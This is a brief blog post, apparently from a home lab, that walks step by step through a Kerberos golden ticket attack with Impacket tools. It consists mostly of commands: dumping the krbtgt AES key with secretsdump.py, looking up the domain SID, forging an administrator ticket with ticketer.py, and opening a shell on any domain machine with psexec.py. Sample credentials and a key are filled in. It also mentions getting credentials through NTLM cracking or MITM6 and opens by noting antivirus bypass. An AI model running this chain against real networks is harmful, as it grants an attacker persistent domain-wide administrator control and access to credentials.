---
layout: post
title: Golden Ticket Attacks using Impacket
---

After playing about with Mimikatz for a bit and looking at a few options to bypass the anti virus, I decided a different tool might make more sense.
Impacket contains a number of tools that can be used to obtain the krbtg hash and the domain SID, create a golden ticket offline and then obtain a shell using the Kerberos ticket.

Notes - credentials are needed to run these commands on the domain controller. These can be obtained by cracking NTLM hashes  or running a MITM6 attack.

<h6>Use secretsdump.py to obtain the aes256 key for the krbtgt account</h6>

  	secretsdump.py <domain>/<user>:<password> <dc-ip>

  	secretsdump.py home.local/TaMBSZZkfd:'?^kigXF?oG,y{o='@10.0.2.250

<h6>Use lookupsid.py to find the domain SID</h6>

  	Lookupsid.py <domain>/<user>:<password> <dc-ip>
   
  	Lookupsid.py home.local/TaMBSZZkfd:'?^kigXF?oG,y{o='@10.0.2.250

<h6>Use ticketer.py to create TGT</h6>

	ticketer.py -aes <aes-256> -domain-sid <SID> -domain <domain> -user-id <500> username
 
	ticketer.py -aes 5735dd8eaf424d966ef640d4056e2eb90310345d58b074103444483bdf736861 -domain-sid S-1-5-21-536825828-3248286720-2276939788 -domain home.local -user-id 500 administrator

<h6>Export KRB5CCNAME to created ticket location</h6>

	export KRB5CCNAME=/home/kali/Documents/administrator.ccache

<h6>Use psexec to obtain a shell on any machine in the domain</h6>

	psexec.py <domain>/<user>@<hostname>.<fqdn> -no-pass -k
  	psexec.py home.local/administrator@TargetPC.home.local -no-pass -k
